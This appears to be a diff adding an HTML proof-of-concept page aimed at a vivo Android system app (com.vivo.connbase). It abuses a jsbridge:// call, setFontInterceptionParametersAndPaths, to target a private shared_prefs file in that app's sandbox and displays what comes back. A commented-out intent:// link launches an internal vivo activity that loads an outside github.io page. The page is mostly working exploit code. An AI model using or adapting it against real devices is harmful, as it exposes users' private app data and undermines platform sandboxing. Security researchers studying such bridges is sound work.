@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Intent 链接测试 (JS控制)</title>
+    <style>
+        /* [样式代码和之前完全一样，这里为了简洁省略了] */
+        /* 您可以从上一个回答中复制完整的 <style> 部分 */
+        body { font-family: sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px 0; margin: 0; flex-direction: column; }
+        .container { background-color: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 500px; }
+        h1 { color: #2c3e50; margin-bottom: 30px; }
+        .intent-button { display: block; text-decoration: none; color: white; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; margin: 15px auto; transition: all 0.3s ease; cursor: pointer; border: none; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; }
+        .intent-button:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(0,0,0,0.15); }
+        .intent-button:active { transform: translateY(1px); box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .btn-goto { background: linear-gradient(45deg, #ff416c, #ff4b2b); }
+        .btn-safe { background: linear-gradient(45deg, #3a7bd5, #00d2ff); }
+        .button-description { font-size: 14px; color: #777; margin-top: -10px; margin-bottom: 25px; }
+    </style>
+</head>
+<body>
+  <div id="content-container">打印沙箱文件内容</div>
+    <div class="container">
+        <h1>Intent 链接按钮</h1>
+<!-- 
+        <button onclick="triggerConnbase()" class="intent-button btn-goto">
+            goto coonbase
+        </button>
+        <p class="button-description">去 connbase</p> -->
+
+        <button onclick="triggerRead()" class="intent-button btn-safe">
+            读沙箱文件
+        </button>
+        <p class="button-description">读沙箱文件</p>
+    </div>
+
+    <!-- JavaScript 代码部分 -->
+    <script>
+        /**
+         * 核心函数：用于跳转到指定的 Intent URI
+         * @param {string} intentUrl - 完整的 intent:// 链接
+         */
+        function launchIntent(intentUrl) {
+            // 在实际跳转前，可以在这里执行任何你需要的 JS 代码
+            console.log("准备跳转到:", intentUrl);
+            
+            // 弹出确认框，给用户一个反悔的机会（这是一个好的实践）
+                // 最简单直接的跳转方式
+                window.location.href = intentUrl;
+                
+                // 更健壮的方式是创建一个隐藏的 iframe 来触发，可以避免一些浏览器兼容性问题
+                /*
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = intentUrl;
+                document.body.appendChild(iframe);
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                }, 1000);
+                */
+            
+        }
+
+        // --- 每个按钮对应的触发函数 ---
+
+        // function triggerConnbase() {
+        //     const url = 'intent:#Intent;action=vivo.intent.action.ACTION_HANDOFF_SETTING_HELP;component=com.vivo.connbase/com.vivo.handoff.setting.help.view.HandOffSettingHelpActivity;S.extra_load_url=https%3A%2F%2Fmomoyu114514-bot.github.io%2F;end';
+        //     launchIntent(url);
+        // }
+
+        function triggerRead() {
+            location = "jsbridge://javacommon/setFontInterceptionParametersAndPaths?callback=test()&data=%7B%22osFontParam%22%3A%22os_font_param%22%2C%22osFontValue%22%3A%22%2Fdata%2Fuser%2f0%2Fcom.vivo.connbase%2Fshared_prefs%2FWebViewChromiumPrefs.xml%22%7D"
+            setTimeout(test,10)
+        }
+        function test() {
+             const container = document.getElementById('content-container');
+             container.innerText = "start"
+            const xhr = new XMLHttpRequest();
+           xhr.open('GET', 'https://momoyu114514-bot.github.io/', true);
+           xhr.onload = function() {
+            console.log("成功接收到 ArrayBuffer 数据！");
+            const receivedArrayBuffer = xhr.response;
+
+        // --- 在这里添加调试代码 ---
+        console.log("响应的数据类型:", typeof receivedArrayBuffer);
+        console.log("响应对象本身:", receivedArrayBuffer);
+            // 这会打印出类似 [79, 84, 84, 79, 0, 1, 0, 0, ...] 这样的字节数组
+            container.innerText = xhr.response
+            
+           }
+           xhr.onerror = function() {
+             container.innerText = 'cnm'
+           }
+
+           xhr.send()
+            
+
+        }
+
+    </script>
+
+</body>
+</html>
